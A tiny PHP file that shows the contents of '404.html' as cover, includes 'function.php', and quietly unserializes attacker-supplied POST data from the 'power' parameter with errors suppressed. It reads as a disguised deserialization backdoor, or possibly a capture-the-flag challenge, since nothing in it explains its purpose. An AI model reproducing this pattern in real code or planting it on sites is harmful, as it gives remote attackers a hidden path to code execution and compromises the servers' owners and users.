<?php
include "404.html";
include "function.php";
@unserialize($_POST['power']);